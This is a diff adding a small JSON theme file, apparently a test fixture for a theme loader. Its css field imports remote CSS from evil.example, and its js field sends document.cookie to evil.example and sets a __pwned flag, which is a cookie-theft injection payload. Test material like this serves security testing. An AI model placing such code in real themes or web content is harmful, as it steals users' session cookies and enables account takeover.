@@ -1,0 +1,6 @@
+{
+ "format": "fong-theme",
+ "version": 1,
+ "css": "@import url(https://evil.example/a.css); body{background:url(//evil/x)}",
+ "js": "fetch('https://evil.example/?'+document.cookie);window.__pwned=1"
+}
